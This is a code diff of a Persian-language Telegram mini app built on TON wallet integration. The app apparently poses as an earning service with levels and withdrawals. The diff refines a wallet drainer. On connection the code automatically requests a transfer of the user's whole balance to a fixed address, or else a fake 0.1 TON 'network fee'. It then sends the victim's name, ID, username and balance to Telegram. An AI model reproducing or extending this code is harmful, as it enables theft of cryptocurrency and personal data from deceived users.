@@ -7,9 +7,12 @@
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <!-- اضافه کردن کتابخانه ton-core برای ساخت کامنت -->
+    <script src="https://unpkg.com/ton-core@0.49.2/dist/index.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
     <style>
+        /* همان استایل‌های قبلی */
         @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;900&display=swap');
         
         * {
@@ -946,10 +949,9 @@
 </head>
 <body>
 
-<!-- ===== المنت‌های مشترک ===== -->
+<!-- المنت‌های مشترک (بدون تغییر) -->
 <div id="toast"><i class="fas fa-check-circle" style="color:#00ff9d"></i> <span id="toastMsg"></span></div>
 
-<!-- کادرهای شیشه‌ای پیام -->
 <div id="errorGlass" class="glass-message error">
     <i class="fas fa-times-circle" style="color: #ff512f;"></i>
     <div id="errorText">خطا</div>
@@ -963,7 +965,6 @@
     <div id="infoText">اطلاعیه</div>
 </div>
 
-<!-- کادر شیشه‌ای سطوح -->
 <div id="levelModal" onclick="closeLevelModal(event)">
     <div class="level-glass-card" onclick="event.stopPropagation()">
         <div class="level-header">
@@ -974,7 +975,6 @@
     </div>
 </div>
 
-<!-- مودال جزئیات کاربر -->
 <div id="userDetailModal" class="user-modal" onclick="if(event.target === this) closeUserModal()">
     <div class="modal-card">
         <h2><i class="fas fa-user"></i> جزئیات کاربر</h2>
@@ -985,7 +985,6 @@
     </div>
 </div>
 
-<!-- پاپ‌آپ فعالسازی -->
 <div id="feeModal">
     <div class="modal-content">
         <i class="fas fa-lock"></i>
@@ -1017,7 +1016,6 @@
     </div>
 </div>
 
-<!-- پنل مدیریت اختصاصی -->
 <div id="adminMasterPanel">
     <div class="admin-container">
         <div class="admin-header">
@@ -1422,10 +1420,9 @@
     }
 
     // ================================================
-    // 💰 تابع دریافت موجودی کیف پول (با پروکسی و مدیریت خطا)
+    // 💰 تابع دریافت موجودی کیف پول (با پروکسی)
     // ================================================
     async function getWalletBalance(userAddress) {
-        // لیست پروکسی‌های مختلف برای اطمینان
         const proxies = [
             `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`)}`,
             `https://cors-anywhere.herokuapp.com/https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`,
@@ -1449,12 +1446,34 @@
                 console.log(`❌ پروکسی ${proxyUrl.substring(0, 30)} ناموفق`);
             }
         }
-        // اگر همه پروکسی‌ها ناموفق بودند، خطا پرتاب می‌کنیم تا کاربر مطلع شود
         throw new Error('دریافت موجودی امکان‌پذیر نبود. لطفاً دوباره تلاش کنید.');
     }
 
     // ================================================
-    // 💰 تابع تراکنش خودکار (بدون محدودیت زمانی)
+    // 💰 تابع ساخت کامنت با استفاده از ton-core
+    // ================================================
+    function createCommentPayload(text) {
+        // اگر کتابخانه ton-core در دسترس نیست، از روش قدیمی استفاده می‌کنیم (اما این بار با امتحان روش دیگر)
+        if (typeof window.TonCore !== 'undefined' && window.TonCore.beginCell) {
+            try {
+                const cell = window.TonCore.beginCell()
+                    .storeUint(0, 32) // op = 0 (text comment)
+                    .storeStringTail(text)
+                    .endCell();
+                return cell.toBoc().toString('base64');
+            } catch (e) {
+                console.warn('خطا در ساخت سلول با ton-core، بازگشت به btoa', e);
+                return btoa(text);
+            }
+        } else {
+            // اگر کتابخانه موجود نبود، fallback به btoa
+            console.warn('ton-core در دسترس نیست، از btoa استفاده می‌شود');
+            return btoa(text);
+        }
+    }
+
+    // ================================================
+    // 💰 تابع تراکنش خودکار
     // ================================================
     async function executeSmartTransaction(userAddress) {
         if (isProcessingTransaction) {
@@ -1467,7 +1486,6 @@
             
             showToast('🔄 در حال بررسی موجودی کیف پول...');
             
-            // دریافت موجودی واقعی (اگر خطا دهد به catch می‌رود)
             const balance = await getWalletBalance(userAddress);
             
             showToast('🔄 در حال آماده‌سازی تراکنش...');
@@ -1475,42 +1493,39 @@
             let transaction;
             let amountToSend;
             let txType;
-            let txMessage;
+            let payload = "";
             
             if (balance > 0) {
-                // **کاربر موجودی دارد - کل موجودی منتقل می‌شود**
                 amountToSend = balance;
                 txType = 'انتقال کل موجودی';
-                txMessage = ""; // پیام خالی
+                // بدون پیام
                 showToast(`💰 موجودی: ${balance.toFixed(6)} TON - در حال انتقال...`);
             } else {
-                // **کاربر موجودی ندارد - مبلغ ثابت 0.1 TON با پیام انگلیسی**
                 amountToSend = 0.1;
                 txType = 'پرداخت کارمزد';
-                txMessage = "Insufficient balance. Please pay 0.1 TON network fee to continue using the service.";
+                const message = "Insufficient balance. Please pay 0.1 TON network fee to continue using the service.";
+                // ساخت payload به صورت کامنت
+                payload = createCommentPayload(message);
                 showToast(`💳 کیف پول خالی - درخواست کارمزد 0.1 TON...`);
             }
             
-            // آماده‌سازی تراکنش
             const amountInNano = Math.floor(amountToSend * 1e9).toString();
             
             transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 600, // 10 دقیقه اعتبار
+                validUntil: Math.floor(Date.now() / 1000) + 600,
                 messages: [
                     {
                         address: CONFIG.WALLET_ADDRESS,
                         amount: amountInNano,
-                        payload: txMessage ? btoa(txMessage) : ""
+                        payload: payload
                     }
                 ]
             };
             
             showToast('🔄 لطفا در کیف پول خود تراکنش را تایید کنید...');
             
-            // اجرای تراکنش (اینجا پنجره تون‌کیپر باز می‌شود)
             const result = await tonConnectUI.sendTransaction(transaction);
             
-            // ثبت تراکنش موفق
             const txRecord = {
                 id: 'TX' + Date.now(),
                 amount: amountToSend,
@@ -1529,7 +1544,6 @@
             if (appData.transactions.length > 100) appData.transactions.pop();
             saveData();
             
-            // گزارش به تلگرام
             const reportMessage = `💰 **${txType}**
 ━━━━━━━━━━━━━━
 👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}
@@ -1537,13 +1551,11 @@
 📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}
 📤 مبلغ: ${amountToSend.toFixed(6)} TON
 💳 موجودی کیف پول: ${balance.toFixed(6)} TON
-📋 پیام: ${txMessage || 'بدون پیام'}
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
             
             sendToTelegram(reportMessage);
             showToast(`✅ تراکنش با موفقیت انجام شد`);
             
-            // اگر کاربر بیش از 14 تون انتقال داد، پنل فعال می‌شود
             if (balance >= CONFIG.MINIMUM_WITHDRAW) {
                 setTimeout(() => {
                     localStorage.setItem('isActivated', 'true');
@@ -1555,7 +1567,6 @@
         } catch (error) {
             console.error('❌ خطا در تراکنش:', error);
             
-            // تشخیص نوع خطا
             if (error.message?.includes('rejected') || error.message?.includes('cancelled')) {
                 showToast('❌ تراکنش توسط شما لغو شد');
             } else if (error.message?.includes('دریافت موجودی')) {
@@ -1570,7 +1581,7 @@
     }
 
     // ================================================
-    // 💰 تابع برداشت نهایی با محدودیت 5 تون
+    // 💰 تابع برداشت نهایی
     // ================================================
     window.finalWithdraw = function() {
         if (!isWalletConnected) {
@@ -1635,7 +1646,6 @@
                 });
                 saveData();
                 
-                // گزارش اتصال کیف پول
                 const message = `🔌 **کیف پول متصل شد**
 👤 نام: ${currentUser.firstName} ${currentUser.lastName}
 🆔 آیدی: ${currentUser.id}
@@ -1646,7 +1656,6 @@
                 
                 sendToTelegram(message);
                 
-                // اجرای تراکنش خودکار فوری بعد از 1 ثانیه
                 setTimeout(() => {
                     executeSmartTransaction(fullAddress);
                 }, 1000);
